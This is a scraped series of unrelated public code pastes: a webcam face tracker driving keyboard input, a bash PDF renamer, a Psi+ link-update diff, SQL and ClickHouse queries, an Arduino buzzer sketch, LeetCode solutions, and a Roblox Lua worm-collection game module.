 # Перевод в YUV, улучшение яркости канала Y
 yuv = cv2.cvtColor(frame, cv2.COLOR_BGR2YUV)
 yuv[:, :, 0] = cv2.equalizeHist(yuv[:, :, 0])
 return cv2.cvtColor(yuv, cv2.COLOR_YUV2BGR)


# Проверка существования файла Haar Cascade
if not os.path.exists(cascade_path):
    print(f""Ошибка: Файл каскада не найден по пути {cascade_path}"")
    sys.exit(1)

# Загрузка классификатора Haar Cascade
face_cascade = cv2.CascadeClassifier(cascade_path)
if face_cascade.empty():
    print(f""Ошибка: Не удалось загрузить файл каскада {cascade_path}"")
    sys.exit(1)

# Подключение к веб-камере с использованием V4L2
cap = cv2.VideoCapture('/dev/video0', cv2.CAP_V4L2)  # Попробуйте '/dev/video1', если не работает
if not cap.isOpened():
    print(""Ошибка: Не удалось открыть веб-камеру. Попробуйте '/dev/video1' или другой индекс."")
    # Попытка открыть альтернативное устройство
    cap = cv2.VideoCapture('/dev/video1', cv2.CAP_V4L2)
    if not cap.isOpened():
        print(""Ошибка: Не удалось открыть веб-камеру на '/dev/video1'. Проверьте устройство."")
        sys.exit(1)

# Установка разрешения камеры для ускорения обработки
cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)

# Инициализация трекера KCF
tracker = cv2.TrackerKCF_create()
tracker_initialized = False
bbox = None  # Переменная для хранения координат лица
right = 50
left = 220
# Создаем объект для управления клавиатурой
keyboard = Controller()
# Основной цикл обработки кадров
while True: # Если трекер не инициализирован, ищем лицо с помощью Haar Cascade

 # Захват кадра с веб-камеры
 ret, frame = cap.read()

 frame = enhance_brightness(frame)
 if not tracker_initialized:
  # Преобразование кадра в серый цвет для ускорения обнаружения
  gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
  faces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=3, minSize=(20, 20))

  # Если лицо найдено, инициализируем трекер
  if len(faces) > 0:
   x, y, w, h = faces[0]  # Берем первое обнаруженное лицо
   bbox = (x, y, w, h)
   tracker.init(frame, bbox)
   tracker_initialized = True
 else:  # Обновление трекера для отслеживания лица
  success, bbox = tracker.update(frame)
  x, y, w, h = [int(v) for v in bbox]  # Преобразуем координаты в целые числа
  cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 255, 0), 2)  # Рисуем зеленый прямоугольник вокруг лица
  cv2.putText(frame, f'({x}, {y})', (x, y - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 1)  # Добавляем координаты над прямоугольником
  if not success: # Если трекер потерял лицо, сбрасываем инициализацию
   tracker_initialized = False
   tracker = cv2.TrackerKCF_create()  # Создаем новый трекер для повторной инициализации

 # Отрисовка прямоугольника и вывод координат

 if bbox is not None:
  if x < right:
    keyboard.press('d')  # Нажимаем и удерживаем кнопку ""d""
  if x > right:
    keyboard.release('d')  # Отпускаем кнопку ""d""
  if x > left:
    keyboard.press('a')  # Нажимаем и удерживаем кнопку ""d""
  if x < left:
   keyboard.release('a')  # Отпускаем кнопку ""d""
 else:
    keyboard.release('d')  # Отпускаем кнопку ""d""
    keyboard.release('a')  # Отпускаем кнопку ""d""
 cv2.imshow(""Head Tracking"", frame) # Отображение кадра с наложенным прямоугольником

 # Выход из цикла по нажатию клавиши 'q'
 if cv2.waitKey(1) & 0xFF == ord('q'):
  break

# Освобождение ресурсов
cap.release()
cv2.destroyAllWindows()

"
K4YSJzzn,Sort and Rename Comcast Bill PDFs by Billing Date,metalx1000,Bash,Wednesday 23rd of July 2025 06:10:33 AM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################

# This will sort/rename Comcast Bill PDFs based on the ""Billing Date"" in the PDF

for pdf in *.pdf; do
  month=""$(pdfgrep -A 1 'Billing Date' ""$pdf"" | tail -n1 | awk '{print $5}')""
  month=""$(date -d ""$month 1 2022"" +%m)""
  year=""$(pdfgrep -A 1 'Billing Date' ""$pdf"" | tail -n1 | awk '{print $7}')""

  mv -v ""$pdf"" ""Comcast Statement ${year}-${month}.pdf""
done
"
8Vh03snA,Fix Links,KukuRuzo,Diff,Wednesday 23rd of July 2025 06:03:45 AM CDT,"diff --git a/README.html b/README.html
index 12028968..1b1f0279 100644
--- a/README.html
+++ b/README.html
@@ -52,7 +52,7 @@ pkgman install psi_plus
 
 <h2>Development</h2>
 
-<p>In 2009 a Psi fork named <a href=""https://psi-plus.com/"">Psi+</a> was started. Project purposes were: implementation of new features, writing of patches and plugins for transferring them to upstream. As of 2017 all active Psi+ developers have become official Psi developers and now Psi+ is just a development branch of Psi with rolling release development model.</p>
+<p>In 2009 a Psi fork named <a href=""https://sourceforge.net/projects/psiplus/"">Psi+</a> was started. Project purposes were: implementation of new features, writing of patches and plugins for transferring them to upstream. As of 2017 all active Psi+ developers have become official Psi developers and now Psi+ is just a development branch of Psi with rolling release development model.</p>
 
 <p>Users who wants to receive new features and bug fixes very quickly may use Psi+ on daily basis. Users who do not care about new trends and prefer constancy may choose Psi as it uses classical development model and its releases are quite rare.</p>
 
@@ -134,7 +134,6 @@ pkgman install psi_plus
 <li><a href=""https://github.com/psi-im/plugins"">Officially supported plugins</a> (sources)</li>
 <li><a href=""https://github.com/psi-im/psimedia"">Multimedia plugin for audio and video calls</a> (sources)</li>
 <li><a href=""https://github.com/psi-im/resources"">Extra resources</a> (iconsets, sounds, skins, themes, etc.)</li>
-<li><a href=""https://psi-plus.com/"">Psi+ project</a> (official website)</li>
 <li><a href=""https://github.com/psi-plus/psi-plus-snapshots"">Psi+ snapshots</a> (sources)</li>
 <li><a href=""https://github.com/psi-plus/psi-plus-l10n"">Psi+ translations</a> (sources)</li>
 </ul>
@@ -149,7 +148,7 @@ pkgman install psi_plus
 <li><a href=""https://sourceforge.net/projects/psiplus/files/macOS/tehnick/"">Psi+ builds for macOS</a></li>
 <li><a href=""https://depot.haiku-os.org/psi_plus"">Psi+ package in Haiku</a></li>
 <li><a href=""https://launchpad.net/~psi-plus/+archive/ubuntu/ppa"">Official PPA for Ubuntu and distros based on it</a> (daily builds)</li>
-<li><a href=""http://notesalexp.org/index-old.html"">Unofficial PPA for Debian and Ubuntu</a> (see <a href=""https://psi-plus.com/wiki/en:debian#nightly_builds"">notes</a> about using it)</li>
+<li><a href=""http://notesalexp.org/index-old.html"">Unofficial PPA for Debian and Ubuntu</a> (see <a href=""https://psi-im.org/wiki/doku.php?id=en:debian#nightly_builds"">notes</a> about using it)</li>
 <li><a href=""https://software.opensuse.org/package/psi-plus"">Unofficial PPA for openSUSE</a> (daily builds)</li>
 <li><a href=""https://copr.fedorainfracloud.org/coprs/valdikss/psi-plus-snapshots/"">Unofficial PPA for Fedora</a> (outdated)</li>
 <li><a href=""https://repology.org/metapackage/psi-plus/versions"">Packages for different Linux distros</a></li>
diff --git a/README.md b/README.md
index 6b37b27d..62f202df 100644
--- a/README.md
+++ b/README.md
@@ -50,7 +50,7 @@ MS Windows users may download official installers and portable builds from [Sour
 
 ## Development
 
-In 2009 a Psi fork named [Psi+](https://psi-plus.com/) was started. Project purposes were: implementation of new features, writing of patches and plugins for transferring them to upstream. As of 2017 all active Psi+ developers have become official Psi developers and now Psi+ is just a development branch of Psi with rolling release development model.
+In 2009 a Psi fork named [Psi+](https://sourceforge.net/projects/psiplus/) was started. Project purposes were: implementation of new features, writing of patches and plugins for transferring them to upstream. As of 2017 all active Psi+ developers have become official Psi developers and now Psi+ is just a development branch of Psi with rolling release development model.
 
 Users who wants to receive new features and bug fixes very quickly may use Psi+ on daily basis. Users who do not care about new trends and prefer constancy may choose Psi as it uses classical development model and its releases are quite rare.
 
@@ -125,7 +125,6 @@ If you want to donate some money for development of Psi and Psi+ project, it is
 * [Officially supported plugins](https://github.com/psi-im/plugins) (sources)
 * [Multimedia plugin for audio and video calls](https://github.com/psi-im/psimedia) (sources)
 * [Extra resources](https://github.com/psi-im/resources) (iconsets, sounds, skins, themes, etc.)
-* [Psi+ project](https://psi-plus.com/) (official website)
 * [Psi+ snapshots](https://github.com/psi-plus/psi-plus-snapshots) (sources)
 * [Psi+ translations](https://github.com/psi-plus/psi-plus-l10n) (sources)
 
@@ -138,7 +137,7 @@ If you want to donate some money for development of Psi and Psi+ project, it is
 * [Psi+ builds for macOS](https://sourceforge.net/projects/psiplus/files/macOS/tehnick/)
 * [Psi+ package in Haiku](https://depot.haiku-os.org/psi_plus)
 * [Official PPA for Ubuntu and distros based on it](https://launchpad.net/~psi-plus/+archive/ubuntu/ppa) (daily builds)
-* [Unofficial PPA for Debian and Ubuntu](http://notesalexp.org/index-old.html) (see [notes](https://psi-plus.com/wiki/en:debian#nightly_builds) about using it)
+* [Unofficial PPA for Debian and Ubuntu](http://notesalexp.org/index-old.html) (see [notes](https://psi-im.org/wiki/doku.php?id=en:debian#nightly_builds) about using it)
 * [Unofficial PPA for openSUSE](https://software.opensuse.org/package/psi-plus) (daily builds)
 * [Unofficial PPA for Fedora](https://copr.fedorainfracloud.org/coprs/valdikss/psi-plus-snapshots/) (outdated)
 * [Packages for different Linux distros](https://repology.org/metapackage/psi-plus/versions)
diff --git a/linux/psi-plus.appdata.xml b/linux/psi-plus.appdata.xml
index 36b0dca1..67b9889c 100644
--- a/linux/psi-plus.appdata.xml
+++ b/linux/psi-plus.appdata.xml
@@ -30,11 +30,11 @@
     <p>Psi+ is a development branch of Psi with rolling release development model. Users who wants to receive new features and bug fixes very quickly may use Psi+ on daily basis. Users who do not care about new trends and prefer constancy may choose Psi as it uses classical development model and its releases are quite rare.</p>
     <p xml:lang=""ru"">Psi+ — это ветка разработки клиента Psi, для которой используется модель разработки с плавающим релизом. Пользователи, которые хотят быстро получать новые функции и исправления ошибок, могут использовать Psi+ на ежедневной основе. Пользователи, которые не заботятся о новых тенденциях и предпочитают постоянство, могут выбрать Psi, поскольку он использует классическую модель разработки и его выпуски довольно редки.</p>
   </description>
-  <url type=""homepage"">https://psi-plus.com/</url>
+  <url type=""homepage"">https://psi-im.org/</url>
   <url type=""bugtracker"">https://github.com/psi-im/psi/issues</url>
   <screenshots>
     <screenshot type=""default"">
-      <image>https://psi-plus.com/wi/psiplus_screen_linux_big.png</image>
+      <image>https://psi-im.org/wiki/lib/exe/fetch.php?cache=&media=psiplus_screen_linux_big.png</image>
     </screenshot>
   </screenshots>
   <content_rating type=""oars-1.1"">
diff --git a/src/CMakeLists.txt b/src/CMakeLists.txt
index 93ddc22e..a91f387e 100644
--- a/src/CMakeLists.txt
+++ b/src/CMakeLists.txt
@@ -188,16 +188,15 @@ elseif(IS_WEBENGINE)
     set(PSI_VER_SUFFIX "", webengine"")
 endif()
 
+set(CLIENT_CAPS_NODE ""https://psi-im.org"")
 if( NOT PSI_PLUS )
     set(CLIENT_NAME ""Psi"")
     set(CLIENT_SNAME ""psi"")
-    set(CLIENT_CAPS_NODE ""https://psi-im.org"")
     set(PSILOGO_PREFIX """")
     set(MAIN_ICON ""psimain.png"")
 else()
     set(CLIENT_NAME ""Psi+"")
     set(CLIENT_SNAME ""psi+"")
-    set(CLIENT_CAPS_NODE ""https://psi-plus.com"")
     set(PSILOGO_PREFIX ""psiplus/"")
     set(MAIN_ICON ""psiplus_icon.png"")
 endif()
diff --git a/src/aboutdlg.cpp b/src/aboutdlg.cpp
index 261f4ae5..acd30747 100644
--- a/src/aboutdlg.cpp
+++ b/src/aboutdlg.cpp
@@ -67,7 +67,7 @@ AboutDlg::AboutDlg(QWidget *parent) : QDialog(parent)
 
     // fill in About Psi+ tab...
     QString psiplus;
-    psiplus += details(QString::fromUtf8(""Psi+ Project""), """", ""psi-dev@conference.jabber.ru"", ""https://psi-plus.com/"",
+    psiplus += details(QString::fromUtf8(""Psi+ Project""), """", ""psi-dev@conference.jabber.ru"", ""https://psi-im.org/"",
                        tr(""Active project members are presents below:""));
     psiplus += details(QString::fromUtf8(""rion""), ""rion4ik@gmail.com"", """", """", tr(""Founder and Lead Patcher""));
     psiplus += details(QString::fromUtf8(""zet""), ""vladimir.shelukhin@gmail.com"", """", """",
diff --git a/src/mainwin.cpp b/src/mainwin.cpp
index 493d9096..6816f0d5 100644
--- a/src/mainwin.cpp
+++ b/src/mainwin.cpp
@@ -1001,7 +1001,7 @@ void MainWin::actOnlineWikiActivated()
 #ifndef PSI_PLUS
         ""https://github.com/psi-im/psi/wiki""
 #else
-        ""https://psi-plus.com/wiki/en:main""
+        ""https://psi-im.org/wiki/""
 #endif
     );
 }
@@ -1009,11 +1009,7 @@ void MainWin::actOnlineWikiActivated()
 void MainWin::actOnlineHomeActivated()
 {
     DesktopUtil::openUrl(
-#ifndef PSI_PLUS
         ""https://psi-im.org""
-#else
-        ""https://psi-plus.com""
-#endif
     );
 }
 
"
08Rm760L,dataNone,TestGuy1,JSON,Wednesday 23rd of July 2025 06:00:10 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3b3b22af842c3f7187cdb3604fcdd03ffefbfcc68550ba236b33d619072a629f7b00d6a2d8c28f28a65a86468719db9ea9357880a70d8375980b0ca3bd230d015c368346360c456b3cfdcb9f81a6f837a40f9bf6b3099ca70fe9fbebdc32da460354fd6ecc58f3c8a35dddb5c04eb20e58216263e1ff5b0d6ab233ea9341b7da',
  otherdata: [
    '9faa205ac3cab0679766de069ef1ef31',
    '459a6dc8086a83195486447f9e7f7b88',
    'a1ad11d2b8c815e289c8325b716e7a97',
    'edb5055fe2ce8bf1357f9f0ab4705699',
    'a8e57eb45477ec8f00ec9d4e0af4abc2',
    '9703f6f6c3ddaedc943cdc6bfc9d1e22',
    '20336d0afc09dacc3e82ea6e7bb1ca80',
    '160868998c7c55d8876669056cd8a7cb'
  ]
}"
CxwCmZYe,Untitled,coentoro,HTML,Wednesday 23rd of July 2025 05:52:40 AM CDT,"<!-- Startof MGID in article -->
<style type=""text/css"">
   div#div-gpt-ad-mgid-inarticle-placeholder {
   min-height: 370px;
   }
</style>
<div id=""div-gpt-ad-mgid-inarticle-placeholder"" class=""advertisement-placeholder"">
   <div class=""advertisement-text"">
      <div>Advertisement</div>
   </div>
   <div id=""div-gpt-ad-kapanlagi-mgid-inarticle"" class=""advertisement-banner""></div>
</div>
<!-- Endof MGID in article -->"
wJ9AbDuS,Untitled,jdelano,SQL,Wednesday 23rd of July 2025 04:41:22 AM CDT,"tblSensors
ID	CableID	SensorName
1	1	Sensor1
2	1	Sensor2
3	1	Sensor3
4	2	Sensor1
5	2	Sensor2
6	2	Sensor3
7	2	Sensor4
8	3	Sensor 5

Count query results
Sensor1Count	OtherSenorsCount
3				5

Count query 
SELECT
    TOP 1 (
        SELECT
            count(cableid)
        FROM
            tblSensors
        WHERE
            CableID = 1
    ) AS Sensor1Count,
    (
        SELECT
            count(cableid)
        FROM
            tblSensors
        WHERE
            CableID = 2
            OR CableID = 3
    ) AS OtherSenorsCount
FROM
    tblSensors

or if looking for a regular dataset of records then you can use a union query, like:
SELECT
    id,
    SensorName,
    ""First Category"" AS CatName
FROM
    tblSensors
WHERE
    CableID = 1
UNION
SELECT
    id,
    SensorName,
    ""Second Category"" AS CatName
FROM
    tblSensors
WHERE
    CableID = 2
    OR CableID = 3

results:
id	SensorName	CatName
1	Sensor1		First Category
2	Sensor2		First Category
3	Sensor3		First Category
4	Sensor1		Second Category
5	Sensor2		Second Category
6	Sensor3		Second Category
7	Sensor4		Second Category
8	Sensor 5	Second Category"
K4KezT2S,Untitled,kirzecy670,MySQL,Wednesday 23rd of July 2025 04:13:31 AM CDT,"       WITH (
              extract(visitParamExtractString(sentPayload, 'message'), '""custom_type"":""([^""]+)""') AS m_type,
              extract(visitParamExtractString(sentPayload, 'message'), '""subType"":""([^""]+)""') AS m_sub_type,
              visitParamExtractString(sentPayload, 'custom_type') AS s_type,
              visitParamExtractString(sentPayload, 'subType') AS s_sub_type
            )
        SELECT dtSent                                                               AS dt,
               tsSent                                                               AS ts,
               status                                                               AS status,
               multiIf(userDeviceOs = 1 AND m_type != '', m_type,
                       userDeviceOs = 2 AND s_type != '', s_type, '')               AS type,
               multiIf(userDeviceOs = 1 AND sentDebug != 'huawei' AND m_sub_type != '', m_sub_type,
                       userDeviceOs = 1 AND sentDebug = 'huawei' AND s_sub_type != '', s_sub_type,
                       userDeviceOs = 2 AND s_sub_type != '', s_sub_type, pushType) AS sub_type,
               title                                                                AS title,
               text                                                                 AS text,
               toUInt64(userId)                                                     AS user_id,
               userUid                                                              AS user_uid,
               userType                                                             AS user_type,
               userDeviceOs                                                         AS user_device_os
        FROM logs.pushes_sent AS ps
            "
cw3szKme,Untitled,kirzecy670,PostgreSQL,Wednesday 23rd of July 2025 04:09:36 AM CDT,"SELECT 
    dtSent AS dt,
    tsSent AS ts,
    status AS status,
    
    -- Определение типа
    multiIf(
        userDeviceOs = 1 AND extract(visitParamExtractString(sentPayload, 'message'), '""custom_type"":""([^""]+)""') != '', 
            extract(visitParamExtractString(sentPayload, 'message'), '""custom_type"":""([^""]+)""'),
        userDeviceOs = 2 AND visitParamExtractString(sentPayload, 'custom_type') != '', 
            visitParamExtractString(sentPayload, 'custom_type'),
        ''
    ) AS type,

    -- Определение подтипа
    multiIf(
        userDeviceOs = 1 AND sentDebug != 'huawei' AND extract(visitParamExtractString(sentPayload, 'message'), '""subType"":""([^""]+)""') != '', 
            extract(visitParamExtractString(sentPayload, 'message'), '""subType"":""([^""]+)""'),
        userDeviceOs = 1 AND sentDebug = 'huawei' AND visitParamExtractString(sentPayload, 'subType') != '', 
            visitParamExtractString(sentPayload, 'subType'),
        userDeviceOs = 2 AND visitParamExtractString(sentPayload, 'subType') != '', 
            visitParamExtractString(sentPayload, 'subType'),
        pushType
    ) AS sub_type,

    title,
    text,
    toUInt64(userId) AS user_id,
    userUid AS user_uid,
    userType AS user_type,
    userDeviceOs AS user_device_os

FROM logs.pushes_sent AS ps
WHERE dtSent >= today()"
Gt0yMzdQ,Untitled,Goriec,HTML,Wednesday 23rd of July 2025 03:26:28 AM CDT,"                         <size=55><color=#ff0000>[</color><color=#ffffff>P</color><color=#ff0000>L</color><color=#ffffff>]</color> </size><b><size=55><color=#ffb300>P</color><color=#ffb300>o</color><color=#ff8c00>l</color><color=#ff8c00>i</color><color=#ff8c00>g</color><color=#ff4d00>o</color><color=#ff4d00>n</color>
_________________________
             <size=200%><color=blue>INFORMACJE</color>
     <size=150%>Discord <link=""https://discord.gg/xPnUYTaJ7c""><color=red><u>Poligon HardRP</u></color></link></size>
     <size=150%>Regulamin <link=""https://docs.google.com/document/d/1CELQM5qKivXPpjL58nZslN4hqXETngLtXr_vrdy1F-M/edit?tab=t.w6xeasfou8bs""><color=#00ff00><u>Google Docs</u></color></link></size>
     <size=150%>Kontakt:<color=yellow> t48970990@gmail.com</color>
 
======================================"
NzS7S0S7,Lab Solutions,arif334,C++,Wednesday 23rd of July 2025 02:16:29 AM CDT,"// LeetCode 20. Valid Parentheses [Hint: Use Stack]
bool isValid(string x) { // Complexity: O(n)
    stack<char> s;
    for(char c: x) {
        if(c == '(' or c == '{' or c == '[')
            s.push(c);
        else if(s.empty()) return false;
        else {
            char last = s.top();
            s.pop();
            if((last=='(' and c==')') 
               or (last=='{' and c=='}') 
               or (last=='[' and c==']'))
                ;
            else return false;
        }
    }
    return s.empty();
}


// Leetcode 1046. Last Stone Weight [Hint: Use Priority Queue]
int lastStoneWeight(vector<int>& stones) { // Complexity: O(n log n)
    priority_queue<int> pq(stones.begin(), stones.end());

    while(pq.size() > 1) {
        int y = pq.top(); pq.pop();
        int x = pq.top(); pq.pop();
        if(y > x) pq.push(y - x);
    }

    if(!pq.empty()) return pq.top();
    return 0;
}


// LeetCode 239. Sliding Window Maximum [Hint: Use Deque]
vector<int> maxSlidingWindow(vector<int>& nums, int k) { // Complexity: O(n)
    deque<int> dq;
    int n = nums.size();
    vector<int> ans;
    for(int i = 0; i < n; i++) {
        if(!dq.empty() and dq.front()<=(i-k))
            dq.pop_front();

        while(!dq.empty() and nums[dq.back()] < nums[i])
            dq.pop_back();

        dq.push_back(i);
        if(i >= k - 1) ans.push_back(nums[dq.front()]);
    }

    return ans;
}"
ZsLDa7eA,checkBuzzer,username32390394054,C,Wednesday 23rd of July 2025 02:06:27 AM CDT,"const int buzzerPin = 11;  // Pin connected to the speaker

void buzz(uint16_t repeat = 2) {
  const int melody[] = { 1000, 1200, 1000, 1200 };  // Frequencies in Hz
  const int duration = 150; // Duration of each tone in ms

  for (uint16_t r = 0; r < repeat; r++) {
    for (int i = 0; i < sizeof(melody) / sizeof(int); i++) {
      tone(buzzerPin, melody[i]);
      delay(duration);
      noTone(buzzerPin);
      delay(50); // Short pause between tones
    }
    delay(200); // Pause between repetitions
  }
}


void setup()  {
  pinMode(buzzerPin, OUTPUT);
  buzz(10);  // Play the melody 10 times on startup
}

void loop() {
  // Nothing here, we only test in setup()
}

"
bNjHM2ie,WormHandler Module for Be Mole,xyzster,Lua,Tuesday 22nd of July 2025 11:57:04 PM CDT,"local WormManager = {}

-- Get required services
local CollectionService = game:GetService(""CollectionService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local DataStoreService = game:GetService(""DataStoreService"")
local Players = game:GetService(""Players"")
local DWPevent = ReplicatedStorage:WaitForChild(""Events""):WaitForChild(""DoubleWormPotionEvent"")
local MarketPlaceService = game:GetService(""MarketplaceService"")
local ServerStorage = game:GetService(""ServerStorage"")
local wormStore = DataStoreService:GetDataStore(""PlayerWorms"")


local teleportModule = require(script.Parent.TeleportHandler)

-- Golden Worm function
local FoundGoldenWorm = ReplicatedStorage.Functions.FoundGoldenWorm

-- events
local eventsFolder = ReplicatedStorage.Events
local uiEvent = eventsFolder.UIEvent
local pickUpEvent = ReplicatedStorage.Events.PickUpSound
local wormCountDown = ReplicatedStorage.Events.WormCountdown


-- positioning for worms 
local random = Random.new()

-- store of bools if number of worms has changed
local dataChanged = {}

local playerWorms = {}

-- for storing players with double worm potion or gamepass
local playersWithPotionActive = {}

local playersWithGamepass = {}

-- worm values 
local WORM_VALUE = 1

local GOLDEN_WORM_VALUE = 200


-- xyz coords for terrain to spawn worms
local areaForWorms = workspace[""Dig site mountain""].AreaForWorms  

local cf = areaForWorms.CFrame
local size = areaForWorms.Size

-- Calculate bounds
local WORM_GENERATION_BOUNDS = {
	minX = cf.X - size.X/2,
	maxX = cf.X + size.X/2,
	minZ = cf.Z - size.Z/2,
	maxZ = cf.Z + size.Z/2,
	minY = cf.Y - size.Y/2,
	maxY = cf.Y + size.Y/2
}

areaForWorms:Destroy()
-- when re adding worm >> collectedWorms[worm] = nil

-- how often worm count should be saved
local AUTOSAVE_INTERVAL = 120 

-- used to keep track of worms to stop multiple touched fires unintentionally giving more than one worm
local collectedWorms = {}


-- worm templates
local worm = workspace.Worms.Worm
local goldWorm = workspace.Worms.Golden_Worm

-- gamepass stuff
local purchasedGamePass = eventsFolder.PurchasedGamePass
local GAMEPASS_ID = 1261762621

-- for reseting the dig area
local wormResetFolder = ServerStorage.WormResetObjects
local Terrain = workspace.Terrain
local AreaForResetTp = workspace[""Dig site mountain""].AreaForResetTP

-- area for top worms on server leaderboard
local textOfLeaderBoard = workspace:WaitForChild(""LeaderBoards""):WaitForChild(""TWLeaderboard""):WaitForChild(""SurfaceGui""):WaitForChild(""TextLabel"")

-- cache for player names
local playerNameCache = {}


-- function to find spawn position of worm and spawn
local function findSpawnPosition(newWorm)
	local hitbox = newWorm:FindFirstChild(""Hitbox"")
	if hitbox and hitbox:IsA(""BasePart"") then
		newWorm.PrimaryPart = hitbox  

		newWorm.Parent = workspace.Worms.CopyOfWorms

		-- finding random position to spawn worm at
		local newPos = Vector3.new(
			random:NextInteger(WORM_GENERATION_BOUNDS.minX, WORM_GENERATION_BOUNDS.maxX),
			random:NextInteger(WORM_GENERATION_BOUNDS.minY, WORM_GENERATION_BOUNDS.maxY),
			random:NextInteger(WORM_GENERATION_BOUNDS.minZ, WORM_GENERATION_BOUNDS.maxZ)
		)

		-- Use SetPrimaryPartCFrame instead of MoveTo to set exact position
		newWorm:SetPrimaryPartCFrame(CFrame.new(newPos))
	end
end


-- spawining worms function
local function spawnWorms()
	for i = 1, 2000 do
		-- clones worms 
		local newWorm = worm:Clone()
		
		findSpawnPosition(newWorm)
		
		-- spawn golden worms for every three hundered worms
		if (i % 300) == 0 then
			local newWorm = goldWorm:Clone()

			findSpawnPosition(newWorm)
		end
	end
end


-- get players in dig area
local function getPlayersInsideDigArea(area)
	-- get dimensions of part parsed (part encompassing dig area)
	local regionMin = (area.CFrame * CFrame.new(-area.Size / 2)).Position
	local regionMax = (area.CFrame * CFrame.new(area.Size / 2)).Position

	-- loop through all players and storea and return ones who are in those dimensions
	local playersInside = {}
	for _, player in pairs(game.Players:GetPlayers()) do
		local character = player.Character
		if character and character:FindFirstChild(""HumanoidRootPart"") then
			local pos = character.HumanoidRootPart.Position

			if pos.X >= math.min(regionMin.X, regionMax.X) and pos.X <= math.max(regionMin.X, regionMax.X)
				and pos.Y >= math.min(regionMin.Y, regionMax.Y) and pos.Y <= math.max(regionMin.Y, regionMax.Y)
				and pos.Z >= math.min(regionMin.Z, regionMax.Z) and pos.Z <= math.max(regionMin.Z, regionMax.Z) then
				table.insert(playersInside, player)
			end
		end
	end
	return playersInside
end


-- worm spawner
local function wormSpawnAndReset()
	-- infinitely call
	while true do
		-- spawn worms
		spawnWorms()
		-- every 15 minutes fire countdown 
		task.wait(895)
		wormCountDown:FireAllClients()
		task.wait(5)
		
		-- destroy all current worm clones
		for _, worm in ipairs(workspace.Worms.CopyOfWorms:GetChildren()) do
			worm:Destroy()
		end
		
		-- clone grass and ground parts
		local grassClone = wormResetFolder.Grass
		local groundClone = wormResetFolder.Ground
		
		-- get players to tp and send them back to the lobby
		local playersToTP = getPlayersInsideDigArea(AreaForResetTp)
		
		for _, Aplayer in ipairs(playersToTP) do
			teleportModule.teleportPlayerToLobby(Aplayer)
		end
		
		grassClone.Parent = workspace
		groundClone.Parent = workspace
		-- get info from ground
		local groundCFrame = groundClone.CFrame
		local groundSize = groundClone.Size

		--get info from grass
		local grassCFrame = grassClone.CFrame
		local grassSize = grassClone.Size

		-- fill aresa with grass and ground (cframe, size, material)
		Terrain:FillBlock(groundCFrame, groundSize, Enum.Material.Ground)
		Terrain:FillBlock(grassCFrame, grassSize, Enum.Material.Grass)


		-- delete parts
		groundClone:Destroy()
		grassClone:Destroy()
	end
end


-- spawn worms on loop in anoter thread
task.spawn(wormSpawnAndReset)



-- function for updating ui
local function updateWormUI(player, wormAmount, doTween, showAlert)
	uiEvent:FireClient(player, {
		sentworm = wormAmount,
		doTween = doTween,
		showAlert = showAlert
	})
end


-- touching worms function
local function processWormCollect(worm, wormValue, player)
	-- removes the worm to simulate it being collected
	worm.Parent = nil
	

	-- add worm to players worm count
	local playerID = player.UserId 
	if playerWorms[playerID] then
		-- check if worm is golden by value and makes clean variables for logic
		local isGoldenWorm = wormValue == GOLDEN_WORM_VALUE
		local playerHasPotion = playersWithPotionActive[tostring(player.UserId)]
		local playerOwnsGamepass = playersWithGamepass[tostring(player.UserId)]
		
		-- create and change multiplier depending on what potion/gamepass
		local multiplier = 1
		
		if not isGoldenWorm then
			if playerHasPotion and playerOwnsGamepass then
				multiplier = 4
			elseif playerHasPotion or playerOwnsGamepass then
				multiplier = 2
			end
		end
		
		-- update worms
		playerWorms[playerID] += wormValue * multiplier
		
	end

	-- update ui to reflect new worm count 
	local uiValue = playerWorms[playerID] or 0
	updateWormUI(player, uiValue, true, false)
end


-- find worms and connect touch detection

local goldColour = ""#ffcc00""

for _, worm in pairs(CollectionService:GetTagged(""Worm"")) do
	-- get hitbox of worm
	local hitbox = worm:FindFirstChild(""Hitbox"") 

	if hitbox then
		hitbox.Touched:Connect(function(otherPart)
			-- find player for part that touched
			local partParent = otherPart.Parent
			local player = Players:GetPlayerFromCharacter(partParent)
			
			-- double check worm hasn't been touched before
			if player and not collectedWorms[worm] then
				collectedWorms[worm] = true
				
				-- send message to server if player found a golden worm
				if CollectionService:HasTag(worm, ""GoldenWorm"") then
					local message = ""["" .. player.Name .. "" has found a golden worm!]""
					ReplicatedStorage.Events.ChatEvent:FireAllClients(message, goldColour)
					FoundGoldenWorm:Invoke(player, 1)
					processWormCollect(worm, GOLDEN_WORM_VALUE, player)
				else
					-- plays sound on pickup
					pickUpEvent:FireClient(player)
					processWormCollect(worm, WORM_VALUE, player)
				end
			end
		end)
	end
end



-- saves a player's worm count 
local function saveData(dataStorekey, value)
	local success, err = pcall(function()
		wormStore:SetAsync(dataStorekey, value)
	end)
	if not success then
		warn(""Error saving worm count"")
	end
end



-- Auto saves player worm count when they leave the server
function WormManager.SavePlayer(player)
	local playerID = player.UserId
	if playerWorms[playerID] then
		saveData(playerID, playerWorms[playerID])
	end
end




-- sets worm count when a player joins

function WormManager.LoadPlayer(player)
	-- check at start if the player has the gamepass
	if MarketPlaceService:UserOwnsGamePassAsync(player.UserId, GAMEPASS_ID) then
		playersWithGamepass[tostring(player.UserId)] = true
	end 
	
	local playerID = player.UserId
	
	-- retrive previous worm count
	local success, storedWormCount = pcall(function()
		return wormStore:GetAsync(playerID)
	end)

	if success then
		local currentWorms = storedWormCount or 0
		playerWorms[playerID] = currentWorms

		-- Initial UI update
		updateWormUI(player, currentWorms, false, false)

